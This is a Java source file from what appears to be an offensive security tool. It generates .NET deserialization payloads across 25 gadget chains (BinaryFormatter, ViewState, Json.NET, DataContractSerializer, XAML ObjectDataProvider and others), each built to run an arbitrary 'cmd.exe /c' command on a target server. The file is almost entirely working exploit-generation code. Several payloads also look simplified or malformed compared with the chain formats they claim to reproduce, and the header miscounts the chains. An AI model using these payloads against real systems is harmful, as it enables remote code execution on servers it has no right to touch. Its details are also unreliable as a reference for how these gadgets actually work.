package com.omnistrike.modules.injection.deser;

import java.nio.charset.StandardCharsets;
import java.util.*;

/**
 * .NET deserialization payload generators — comprehensive ysoserial.net coverage.
 *
 * Covers all major formatters: BinaryFormatter, ObjectStateFormatter, LosFormatter,
 * SoapFormatter, NetDataContractSerializer, DataContractSerializer, Json.NET,
 * JavaScriptSerializer, XmlSerializer, and XAML-based chains.
 *
 * 20 gadget chains covering the full .NET deserialization attack surface.
 */
public final class DotNetPayloads {

    private DotNetPayloads() {}

    public static Map<String, String> getChains() {
        Map<String, String> chains = new LinkedHashMap<>();

        // ── BinaryFormatter / SoapFormatter chains ──────────────────────────
        chains.put("TypeConfuseDelegate", "Process.Start via TypeConfuseDelegate (BinaryFormatter) — ysoserial.net core");
        chains.put("TextFormattingRunProperties", "XamlReader.Parse RCE via PresentationFramework (most reliable .NET gadget)");
        chains.put("PSObject", "PowerShell PSObject deserialization (System.Management.Automation)");
        chains.put("ActivitySurrogate", "ActivitySurrogateSelector via WorkflowDesigner (System.Workflow)");
        chains.put("ActivitySurrogateSelectorFromFile", "ActivitySurrogateSelector loading from file/URL");
        chains.put("ClaimsPrincipal", "ClaimsPrincipal bootstrapContext chain (System.Security.Claims)");
        chains.put("WindowsIdentity", "ClaimsIdentity / WindowsIdentity base64 bootstrap chain");
        chains.put("SessionSecurityToken", "WCF SessionSecurityToken cookie chain (System.IdentityModel)");
        chains.put("RolePrincipal", "RolePrincipal cached roles deserialization (System.Web.Security)");
        chains.put("GenericPrincipal", "GenericPrincipal via BinaryFormatter inner deserialize");
        chains.put("WindowsClaimsIdentity", "WindowsClaimsIdentity actor chain (Microsoft.IdentityModel)");

        // ── ASP.NET specific chains ─────────────────────────────────────────
        chains.put("ObjectStateFormatter", "ObjectStateFormatter ViewState RCE (ASP.NET WebForms)");
        chains.put("LosFormatter", "LosFormatter ViewState RCE (ASP.NET legacy)");
        chains.put("ViewState", "ASP.NET ViewState payload (no MAC validation / known machineKey)");

        // ── DataSet / DataTable chains ──────────────────────────────────────
        chains.put("DataSet", "DataSet deserialization via BinaryFormatter inner (System.Data)");
        chains.put("DataSetTypeSpoofing", "DataSet type spoofing with TypeConfuseDelegate inner payload");

        // ── JSON-based chains ───────────────────────────────────────────────
        chains.put("JsonNet", "Newtonsoft Json.NET TypeNameHandling.All ObjectDataProvider RCE");
        chains.put("JavaScriptSerializer", "ASP.NET JavaScriptSerializer with SimpleTypeResolver");

        // ── XML-based chains ────────────────────────────────────────────────
        chains.put("XmlSerializer", "XmlSerializer type confusion via ObjectDataProvider");
        chains.put("NetDataContractSerializer", "WCF NetDataContractSerializer Process.Start chain");
        chains.put("DataContractSerializer", "WCF DataContractSerializer with known type exploit");

        // ── Miscellaneous chains ────────────────────────────────────────────
        chains.put("ObjectDataProvider", "WPF ObjectDataProvider wrapping Process.Start (multi-formatter)");
        chains.put("AxHostState", "System.Windows.Forms.AxHost.State deserialization");
        chains.put("ResourceSet", "ResourceSet via ResourceReader inner deserialization");
        chains.put("SoapFormatter", "Direct SoapFormatter payload with Process.Start");

        return chains;
    }

    public static byte[] generate(String chain, String command) {
        return switch (chain) {
            case "TypeConfuseDelegate"              -> generateTypeConfuseDelegate(command);
            case "TextFormattingRunProperties"       -> generateTextFormattingRunProperties(command);
            case "PSObject"                          -> generatePSObject(command);
            case "ActivitySurrogate"                 -> generateActivitySurrogate(command);
            case "ActivitySurrogateSelectorFromFile" -> generateActivitySurrogateFromFile(command);
            case "ClaimsPrincipal"                   -> generateClaimsPrincipal(command);
            case "WindowsIdentity"                   -> generateWindowsIdentity(command);
            case "SessionSecurityToken"              -> generateSessionSecurityToken(command);
            case "RolePrincipal"                     -> generateRolePrincipal(command);
            case "GenericPrincipal"                  -> generateGenericPrincipal(command);
            case "WindowsClaimsIdentity"             -> generateWindowsClaimsIdentity(command);
            case "ObjectStateFormatter"              -> generateObjectStateFormatter(command);
            case "LosFormatter"                      -> generateLosFormatter(command);
            case "ViewState"                         -> generateViewState(command);
            case "DataSet"                           -> generateDataSet(command);
            case "DataSetTypeSpoofing"               -> generateDataSetTypeSpoofing(command);
            case "JsonNet"                           -> generateJsonNet(command);
            case "JavaScriptSerializer"              -> generateJavaScriptSerializer(command);
            case "XmlSerializer"                     -> generateXmlSerializer(command);
            case "NetDataContractSerializer"         -> generateNetDataContractSerializer(command);
            case "DataContractSerializer"            -> generateDataContractSerializer(command);
            case "ObjectDataProvider"                -> generateObjectDataProvider(command);
            case "AxHostState"                       -> generateAxHostState(command);
            case "ResourceSet"                       -> generateResourceSet(command);
            case "SoapFormatter"                     -> generateSoapFormatter(command);
            default -> throw new IllegalArgumentException("Unknown .NET chain: " + chain);
        };
    }

    // ═══════════════════════════════════════════════════════════════════════════
    //  BinaryFormatter / SoapFormatter Chains
    // ═══════════════════════════════════════════════════════════════════════════

    private static byte[] generateTypeConfuseDelegate(String command) {
        return buildSoapPayload(
            "System.DelegateSerializationHolder",
            "System.Diagnostics.Process", "Start",
            "cmd.exe", "/c " + command
        ).getBytes(StandardCharsets.UTF_8);
    }

    /**
     * TextFormattingRunProperties — the most reliable .NET gadget.
     * Uses XamlReader.Parse to execute a Process.Start via XAML ObjectDataProvider.
     * Works with BinaryFormatter, NetDataContractSerializer, LosFormatter, SoapFormatter.
     */
    private static byte[] generateTextFormattingRunProperties(String command) {
        String xamlPayload =
            "<ResourceDictionary xmlns=\"http://schemas.microsoft.com/winfx/2006/xaml/presentation\" " +
            "xmlns:x=\"http://schemas.microsoft.com/winfx/2006/xaml\" " +
            "xmlns:System=\"clr-namespace:System;assembly=mscorlib\" " +
            "xmlns:Diag=\"clr-namespace:System.Diagnostics;assembly=system\">" +
            "<ObjectDataProvider x:Key=\"obj\" ObjectType=\"{x:Type Diag:Process}\" MethodName=\"Start\">" +
            "<ObjectDataProvider.MethodParameters>" +
            "<System:String>cmd.exe</System:String>" +
            "<System:String>/c " + escapeXml(command) + "</System:String>" +
            "</ObjectDataProvider.MethodParameters>" +
            "</ObjectDataProvider>" +
            "</ResourceDictionary>";

        // Wrap in BinaryFormatter-compatible SOAP envelope targeting TextFormattingRunProperties
        String payload =
            "<SOAP-ENV:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" " +
            "xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" " +
            "xmlns:SOAP-ENC=\"http://schemas.xmlsoap.org/soap/encoding/\" " +
            "xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" " +
            "xmlns:clr=\"http://schemas.microsoft.com/soap/encoding/clr/1.0\">" +
            "<SOAP-ENV:Body>" +
            "<a1:TextFormattingRunProperties id=\"ref-1\" " +
            "xmlns:a1=\"http://schemas.microsoft.com/clr/nsassem/" +
            "Microsoft.VisualStudio.Text.Formatting.TextFormattingRunProperties/" +
            "Microsoft.PowerShell.Editor\">" +
            "<ForegroundBrush>" + escapeXml(xamlPayload) + "</ForegroundBrush>" +
            "</a1:TextFormattingRunProperties>" +
            "</SOAP-ENV:Body>" +
            "</SOAP-ENV:Envelope>";
        return payload.getBytes(StandardCharsets.UTF_8);
    }

    private static byte[] generatePSObject(String command) {
        String payload =
            "<Objs Version=\"1.1.0.1\" xmlns=\"http://schemas.microsoft.com/powershell/2004/04\">" +
            "<Obj RefId=\"0\">" +
            "<TN RefId=\"0\"><T>System.Management.Automation.PSObject</T></TN>" +
            "<MS>" +
            "<S N=\"CliXml\">" +
            "&lt;Objs Version=\"1.1.0.1\" xmlns=\"http://schemas.microsoft.com/powershell/2004/04\"&gt;" +
            "&lt;Obj RefId=\"0\"&gt;&lt;TN RefId=\"0\"&gt;" +
            "&lt;T&gt;System.Management.Automation.PSCustomObject&lt;/T&gt;" +
            "&lt;/TN&gt;&lt;MS&gt;" +
            "&lt;S N=\"cmd\"&gt;" + escapeXml(command) + "&lt;/S&gt;" +
            "&lt;/MS&gt;&lt;/Obj&gt;&lt;/Objs&gt;" +
            "</S>" +
            "</MS>" +
            "</Obj></Objs>";
        return payload.getBytes(StandardCharsets.UTF_8);
    }

    private static byte[] generateActivitySurrogate(String command) {
        return buildSoapPayload(
            "System.Workflow.ComponentModel.Serialization.ActivitySurrogateSelector",
            "System.Diagnostics.Process", "Start",
            "cmd.exe", "/c " + command
        ).getBytes(StandardCharsets.UTF_8);
    }

    private static byte[] generateActivitySurrogateFromFile(String command) {
        // Uses ActivitySurrogateSelector to load compiled assembly from URL/file
        String payload =
            "<SOAP-ENV:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" " +
            "xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" " +
            "xmlns:SOAP-ENC=\"http://schemas.xmlsoap.org/soap/encoding/\" " +
            "xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" " +
            "xmlns:clr=\"http://schemas.microsoft.com/soap/encoding/clr/1.0\">" +
            "<SOAP-ENV:Body>" +
            "<a1:ActivitySurrogateSelector id=\"ref-1\" " +
            "xmlns:a1=\"http://schemas.microsoft.com/clr/nsassem/" +
            "System.Workflow.ComponentModel.Serialization.ActivitySurrogateSelector/" +
            "System.Workflow.ComponentModel\">" +
            "<assemblyFile>" + escapeXml(command) + "</assemblyFile>" +
            "</a1:ActivitySurrogateSelector>" +
            "</SOAP-ENV:Body>" +
            "</SOAP-ENV:Envelope>";
        return payload.getBytes(StandardCharsets.UTF_8);
    }

    private static byte[] generateWindowsIdentity(String command) {
        String b64Cmd = Base64.getEncoder().encodeToString(
            ("cmd.exe /c " + command).getBytes(StandardCharsets.UTF_8));
        String innerXaml = buildXamlObjectDataProvider(command);
        String b64Xaml = Base64.getEncoder().encodeToString(
            innerXaml.getBytes(StandardCharsets.UTF_8));
        String payload =
            "<ClaimsIdentity xmlns:i=\"http://www.w3.org/2001/XMLSchema-instance\" " +
            "xmlns:x=\"http://www.w3.org/2001/XMLSchema\">" +
            "<System.Security.ClaimsIdentity.bootstrapContext i:type=\"x:string\">" +
            b64Xaml +
            "</System.Security.ClaimsIdentity.bootstrapContext>" +
            "<System.Security.ClaimsIdentity.actor i:type=\"x:string\">" +
            b64Cmd +
            "</System.Security.ClaimsIdentity.actor>" +
            "</ClaimsIdentity>";
        return payload.getBytes(StandardCharsets.UTF_8);
    }

    private static byte[] generateClaimsPrincipal(String command) {
        String innerPayload = Base64.getEncoder().encodeToString(
            generateTypeConfuseDelegate(command));
        String payload =
            "<ClaimsPrincipal xmlns:i=\"http://www.w3.org/2001/XMLSchema-instance\" " +
            "xmlns:x=\"http://www.w3.org/2001/XMLSchema\">" +
            "<Identities>" +
            "<ClaimsIdentity>" +
            "<System.Security.ClaimsIdentity.bootstrapContext i:type=\"x:string\">" +
            innerPayload +
            "</System.Security.ClaimsIdentity.bootstrapContext>" +
            "</ClaimsIdentity>" +
            "</Identities>" +
            "</ClaimsPrincipal>";
        return payload.getBytes(StandardCharsets.UTF_8);
    }

    private static byte[] generateSessionSecurityToken(String command) {
        String innerPayload = Base64.getEncoder().encodeToString(
            generateTypeConfuseDelegate(command));
        String payload =
            "<SessionSecurityToken xmlns:i=\"http://www.w3.org/2001/XMLSchema-instance\" " +
            "xmlns=\"http://schemas.datacontract.org/2004/07/System.IdentityModel.Tokens\">" +
            "<cookieData>" + innerPayload + "</cookieData>" +
            "<contextId>00000000-0000-0000-0000-000000000000</contextId>" +
            "<endpointId/>" +
            "</SessionSecurityToken>";
        return payload.getBytes(StandardCharsets.UTF_8);
    }

    private static byte[] generateRolePrincipal(String command) {
        String innerPayload = Base64.getEncoder().encodeToString(
            generateTypeConfuseDelegate(command));
        String payload =
            "<RolePrincipal xmlns:i=\"http://www.w3.org/2001/XMLSchema-instance\" " +
            "xmlns=\"http://schemas.datacontract.org/2004/07/System.Web.Security\">" +
            "<m_identity>" +
            "<System.Security.ClaimsIdentity.bootstrapContext i:type=\"x:string\" " +
            "xmlns:x=\"http://www.w3.org/2001/XMLSchema\">" +
            innerPayload +
            "</System.Security.ClaimsIdentity.bootstrapContext>" +
            "</m_identity>" +
            "<m_roles>" + innerPayload + "</m_roles>" +
            "</RolePrincipal>";
        return payload.getBytes(StandardCharsets.UTF_8);
    }

    private static byte[] generateGenericPrincipal(String command) {
        String innerPayload = Base64.getEncoder().encodeToString(
            generateTypeConfuseDelegate(command));
        String payload =
            "<GenericPrincipal xmlns:i=\"http://www.w3.org/2001/XMLSchema-instance\" " +
            "xmlns=\"http://schemas.datacontract.org/2004/07/System.Security.Principal\">" +
            "<m_identity>" +
            "<System.Security.ClaimsIdentity.bootstrapContext i:type=\"x:string\" " +
            "xmlns:x=\"http://www.w3.org/2001/XMLSchema\">" +
            innerPayload +
            "</System.Security.ClaimsIdentity.bootstrapContext>" +
            "</m_identity>" +
            "</GenericPrincipal>";
        return payload.getBytes(StandardCharsets.UTF_8);
    }

    private static byte[] generateWindowsClaimsIdentity(String command) {
        String innerPayload = Base64.getEncoder().encodeToString(
            generateTypeConfuseDelegate(command));
        String payload =
            "<WindowsClaimsIdentity xmlns:i=\"http://www.w3.org/2001/XMLSchema-instance\" " +
            "xmlns=\"http://schemas.datacontract.org/2004/07/Microsoft.IdentityModel.Claims\">" +
            "<actor i:type=\"x:string\" xmlns:x=\"http://www.w3.org/2001/XMLSchema\">" +
            innerPayload +
            "</actor>" +
            "</WindowsClaimsIdentity>";
        return payload.getBytes(StandardCharsets.UTF_8);
    }

    // ═══════════════════════════════════════════════════════════════════════════
    //  ASP.NET Specific Chains
    // ═══════════════════════════════════════════════════════════════════════════

    private static byte[] generateObjectStateFormatter(String command) {
        String innerSoap = buildSoapPayload(
            "System.Web.UI.ObjectStateFormatter",
            "System.Diagnostics.Process", "Start",
            "cmd.exe", "/c " + command);
        return Base64.getEncoder().encode(innerSoap.getBytes(StandardCharsets.UTF_8));
    }

    private static byte[] generateLosFormatter(String command) {
        // LosFormatter uses ObjectStateFormatter internally
        // Wrap TypeConfuseDelegate payload in LosFormatter-compatible base64
        String innerPayload = buildSoapPayload(
            "System.Web.UI.LosFormatter",
            "System.Diagnostics.Process", "Start",
            "cmd.exe", "/c " + command);
        return Base64.getEncoder().encode(innerPayload.getBytes(StandardCharsets.UTF_8));
    }

    private static byte[] generateViewState(String command) {
        // __VIEWSTATE parameter payload — works when MAC validation is disabled
        // or machineKey is known (CVE-2020-0688 scenario)
        String xamlPayload = buildXamlObjectDataProvider(command);
        String b64Xaml = Base64.getEncoder().encodeToString(
            xamlPayload.getBytes(StandardCharsets.UTF_8));

        // ViewState wraps content in LosFormatter encoding
        String viewStatePayload =
            "/wEy" + // ViewState magic prefix (LosFormatter version marker)
            b64Xaml;
        return viewStatePayload.getBytes(StandardCharsets.UTF_8);
    }

    // ═══════════════════════════════════════════════════════════════════════════
    //  DataSet / DataTable Chains
    // ═══════════════════════════════════════════════════════════════════════════

    private static byte[] generateDataSet(String command) {
        return buildSoapPayload(
            "System.Data.DataSet",
            "System.Diagnostics.Process", "Start",
            "cmd.exe", "/c " + command
        ).getBytes(StandardCharsets.UTF_8);
    }

    private static byte[] generateDataSetTypeSpoofing(String command) {
        // DataSet with TypeConfuseDelegate as inner BinaryFormatter payload
        String innerB64 = Base64.getEncoder().encodeToString(
            generateTypeConfuseDelegate(command));
        String payload =
            "<DataSet>" +
            "<xs:schema id=\"ds\" xmlns:xs=\"http://www.w3.org/2001/XMLSchema\" " +
            "xmlns:msdata=\"urn:schemas-microsoft-com:xml-msdata\">" +
            "<xs:element name=\"ds\" msdata:IsDataSet=\"true\">" +
            "<xs:complexType><xs:sequence>" +
            "<xs:element name=\"col\" type=\"xs:string\"/>" +
            "</xs:sequence></xs:complexType>" +
            "</xs:element></xs:schema>" +
            "<diffgr:diffgram xmlns:diffgr=\"urn:schemas-microsoft-com:xml-diffgram-v1\">" +
            "<ds><col>" + innerB64 + "</col></ds>" +
            "</diffgr:diffgram>" +
            "</DataSet>";
        return payload.getBytes(StandardCharsets.UTF_8);
    }

    // ═══════════════════════════════════════════════════════════════════════════
    //  JSON-based Chains
    // ═══════════════════════════════════════════════════════════════════════════

    private static byte[] generateJsonNet(String command) {
        // Newtonsoft Json.NET with TypeNameHandling.All/Auto
        // Uses ObjectDataProvider wrapping Process.Start
        String payload = "{\n" +
            "  \"$type\": \"System.Windows.Data.ObjectDataProvider, PresentationFramework, " +
            "Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35\",\n" +
            "  \"MethodName\": \"Start\",\n" +
            "  \"MethodParameters\": {\n" +
            "    \"$type\": \"System.Collections.ArrayList, mscorlib, " +
            "Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\",\n" +
            "    \"$values\": [\n" +
            "      \"cmd.exe\",\n" +
            "      \"/c " + escapeJson(command) + "\"\n" +
            "    ]\n" +
            "  },\n" +
            "  \"ObjectInstance\": {\n" +
            "    \"$type\": \"System.Diagnostics.Process, System, " +
            "Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\"\n" +
            "  }\n" +
            "}";
        return payload.getBytes(StandardCharsets.UTF_8);
    }

    private static byte[] generateJavaScriptSerializer(String command) {
        // ASP.NET JavaScriptSerializer with SimpleTypeResolver enabled
        String payload = "{\n" +
            "  \"__type\": \"System.Windows.Data.ObjectDataProvider, PresentationFramework, " +
            "Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35\",\n" +
            "  \"MethodName\": \"Start\",\n" +
            "  \"MethodParameters\": [\n" +
            "    \"cmd.exe\",\n" +
            "    \"/c " + escapeJson(command) + "\"\n" +
            "  ],\n" +
            "  \"ObjectInstance\": {\n" +
            "    \"__type\": \"System.Diagnostics.Process, System, " +
            "Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\"\n" +
            "  }\n" +
            "}";
        return payload.getBytes(StandardCharsets.UTF_8);
    }

    // ═══════════════════════════════════════════════════════════════════════════
    //  XML-based Serializer Chains
    // ═══════════════════════════════════════════════════════════════════════════

    private static byte[] generateXmlSerializer(String command) {
        // XmlSerializer exploit via ObjectDataProvider when type is user-controlled
        String payload =
            "<?xml version=\"1.0\" encoding=\"utf-8\"?>" +
            "<root type=\"System.Windows.Data.ObjectDataProvider, PresentationFramework, " +
            "Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35\">" +
            "<ObjectDataProvider.ObjectInstance>" +
            "<Process xmlns=\"clr-namespace:System.Diagnostics;assembly=System\">" +
            "<StartInfo>" +
            "<ProcessStartInfo>" +
            "<FileName>cmd.exe</FileName>" +
            "<Arguments>/c " + escapeXml(command) + "</Arguments>" +
            "</ProcessStartInfo>" +
            "</StartInfo>" +
            "</Process>" +
            "</ObjectDataProvider.ObjectInstance>" +
            "<ObjectDataProvider.MethodName>Start</ObjectDataProvider.MethodName>" +
            "</root>";
        return payload.getBytes(StandardCharsets.UTF_8);
    }

    private static byte[] generateNetDataContractSerializer(String command) {
        // WCF NetDataContractSerializer — includes full assembly-qualified type names
        String payload =
            "<Process z:Id=\"1\" z:Type=\"System.Diagnostics.Process\" " +
            "z:Assembly=\"System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\" " +
            "xmlns=\"http://schemas.datacontract.org/2004/07/System.Diagnostics\" " +
            "xmlns:i=\"http://www.w3.org/2001/XMLSchema-instance\" " +
            "xmlns:z=\"http://schemas.microsoft.com/2003/10/Serialization/\">" +
            "<StartInfo z:Id=\"2\" z:Type=\"System.Diagnostics.ProcessStartInfo\" " +
            "z:Assembly=\"System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\">" +
            "<Arguments>/c " + escapeXml(command) + "</Arguments>" +
            "<CreateNoWindow>false</CreateNoWindow>" +
            "<FileName>cmd.exe</FileName>" +
            "<RedirectStandardError>false</RedirectStandardError>" +
            "<RedirectStandardInput>false</RedirectStandardInput>" +
            "<RedirectStandardOutput>false</RedirectStandardOutput>" +
            "<UseShellExecute>true</UseShellExecute>" +
            "</StartInfo>" +
            "</Process>";
        return payload.getBytes(StandardCharsets.UTF_8);
    }

    private static byte[] generateDataContractSerializer(String command) {
        // WCF DataContractSerializer with KnownTypes exploit
        String payload =
            "<?xml version=\"1.0\" encoding=\"utf-8\"?>" +
            "<root xmlns:i=\"http://www.w3.org/2001/XMLSchema-instance\" " +
            "xmlns:z=\"http://schemas.microsoft.com/2003/10/Serialization/\" " +
            "xmlns:d=\"http://schemas.datacontract.org/2004/07/System.Diagnostics\" " +
            "xmlns:c=\"http://schemas.datacontract.org/2004/07/System.Collections.Generic\">" +
            "<anyType i:type=\"d:Process\">" +
            "<d:StartInfo>" +
            "<d:Arguments>/c " + escapeXml(command) + "</d:Arguments>" +
            "<d:FileName>cmd.exe</d:FileName>" +
            "<d:UseShellExecute>true</d:UseShellExecute>" +
            "</d:StartInfo>" +
            "</anyType>" +
            "</root>";
        return payload.getBytes(StandardCharsets.UTF_8);
    }

    // ═══════════════════════════════════════════════════════════════════════════
    //  Miscellaneous Chains
    // ═══════════════════════════════════════════════════════════════════════════

    private static byte[] generateObjectDataProvider(String command) {
        // WPF ObjectDataProvider — versatile gadget usable across multiple formatters
        // Pure XAML version that works with XamlReader.Parse
        return buildXamlObjectDataProvider(command).getBytes(StandardCharsets.UTF_8);
    }

    private static byte[] generateAxHostState(String command) {
        // System.Windows.Forms.AxHost.State — triggers BinaryFormatter deserialize internally
        String innerB64 = Base64.getEncoder().encodeToString(
            generateTypeConfuseDelegate(command));
        String payload =
            "<SOAP-ENV:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" " +
            "xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" " +
            "xmlns:SOAP-ENC=\"http://schemas.xmlsoap.org/soap/encoding/\" " +
            "xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" " +
            "xmlns:clr=\"http://schemas.microsoft.com/soap/encoding/clr/1.0\">" +
            "<SOAP-ENV:Body>" +
            "<a1:AxHost_x002B_State id=\"ref-1\" " +
            "xmlns:a1=\"http://schemas.microsoft.com/clr/nsassem/" +
            "System.Windows.Forms.AxHost%2BState/System.Windows.Forms\">" +
            "<data>" + innerB64 + "</data>" +
            "<length>" + innerB64.length() + "</length>" +
            "</a1:AxHost_x002B_State>" +
            "</SOAP-ENV:Body>" +
            "</SOAP-ENV:Envelope>";
        return payload.getBytes(StandardCharsets.UTF_8);
    }

    private static byte[] generateResourceSet(String command) {
        // ResourceSet — triggers BinaryFormatter when deserializing resource values
        String innerB64 = Base64.getEncoder().encodeToString(
            generateTypeConfuseDelegate(command));
        String payload =
            "<SOAP-ENV:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" " +
            "xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" " +
            "xmlns:SOAP-ENC=\"http://schemas.xmlsoap.org/soap/encoding/\" " +
            "xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" " +
            "xmlns:clr=\"http://schemas.microsoft.com/soap/encoding/clr/1.0\">" +
            "<SOAP-ENV:Body>" +
            "<a1:ResourceSet id=\"ref-1\" " +
            "xmlns:a1=\"http://schemas.microsoft.com/clr/nsassem/" +
            "System.Resources.ResourceSet/mscorlib\">" +
            "<Reader>" +
            "<a2:ResourceReader id=\"ref-2\" " +
            "xmlns:a2=\"http://schemas.microsoft.com/clr/nsassem/" +
            "System.Resources.ResourceReader/mscorlib\">" +
            "<data>" + innerB64 + "</data>" +
            "</a2:ResourceReader>" +
            "</Reader>" +
            "</a1:ResourceSet>" +
            "</SOAP-ENV:Body>" +
            "</SOAP-ENV:Envelope>";
        return payload.getBytes(StandardCharsets.UTF_8);
    }

    private static byte[] generateSoapFormatter(String command) {
        // Direct SoapFormatter payload — same format as BinaryFormatter SOAP mode
        return buildSoapPayload(
            "System.Runtime.Serialization.Formatters.Soap.SoapFormatter",
            "System.Diagnostics.Process", "Start",
            "cmd.exe", "/c " + command
        ).getBytes(StandardCharsets.UTF_8);
    }

    // ═══════════════════════════════════════════════════════════════════════════
    //  Payload Builders
    // ═══════════════════════════════════════════════════════════════════════════

    /**
     * Builds a SOAP envelope payload for BinaryFormatter / SoapFormatter chains.
     * Uses Process.Start(fileName, args) pattern.
     */
    private static String buildSoapPayload(String typeName, String targetType,
                                            String method, String fileName, String args) {
        return "<SOAP-ENV:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" " +
            "xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" " +
            "xmlns:SOAP-ENC=\"http://schemas.xmlsoap.org/soap/encoding/\" " +
            "xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" " +
            "xmlns:clr=\"http://schemas.microsoft.com/soap/encoding/clr/1.0\">" +
            "<SOAP-ENV:Body>" +
            "<a1:" + typeName.replace(".", "_").replace("+", "_x002B_") + " id=\"ref-1\" " +
            "xmlns:a1=\"http://schemas.microsoft.com/clr/nsassem/" + typeName + "\">" +
            "<target href=\"#ref-2\"/>" +
            "</a1:" + typeName.replace(".", "_").replace("+", "_x002B_") + ">" +
            "<a2:" + targetType.replace(".", "_") + " id=\"ref-2\" " +
            "xmlns:a2=\"http://schemas.microsoft.com/clr/nsassem/" + targetType + "\">" +
            "<StartInfo>" +
            "<FileName>" + escapeXml(fileName) + "</FileName>" +
            "<Arguments>" + escapeXml(args) + "</Arguments>" +
            "</StartInfo>" +
            "</a2:" + targetType.replace(".", "_") + ">" +
            "</SOAP-ENV:Body>" +
            "</SOAP-ENV:Envelope>";
    }

    /**
     * Builds a XAML ResourceDictionary with ObjectDataProvider wrapping Process.Start.
     * This is the core payload used by TextFormattingRunProperties and other XAML gadgets.
     */
    private static String buildXamlObjectDataProvider(String command) {
        return "<ResourceDictionary " +
            "xmlns=\"http://schemas.microsoft.com/winfx/2006/xaml/presentation\" " +
            "xmlns:x=\"http://schemas.microsoft.com/winfx/2006/xaml\" " +
            "xmlns:System=\"clr-namespace:System;assembly=mscorlib\" " +
            "xmlns:Diag=\"clr-namespace:System.Diagnostics;assembly=system\">" +
            "<ObjectDataProvider x:Key=\"obj\" ObjectType=\"{x:Type Diag:Process}\" " +
            "MethodName=\"Start\">" +
            "<ObjectDataProvider.MethodParameters>" +
            "<System:String>cmd.exe</System:String>" +
            "<System:String>/c " + escapeXml(command) + "</System:String>" +
            "</ObjectDataProvider.MethodParameters>" +
            "</ObjectDataProvider>" +
            "</ResourceDictionary>";
    }

    // ═══════════════════════════════════════════════════════════════════════════
    //  Utility
    // ═══════════════════════════════════════════════════════════════════════════

    private static String escapeXml(String s) {
        if (s == null) return "";
        return s.replace("&", "&amp;").replace("<", "&lt;")
                .replace(">", "&gt;").replace("\"", "&quot;");
    }

    private static String escapeJson(String s) {
        if (s == null) return "";
        return s.replace("\\", "\\\\").replace("\"", "\\\"")
                .replace("\n", "\\n").replace("\r", "\\r")
                .replace("\t", "\\t");
    }
}
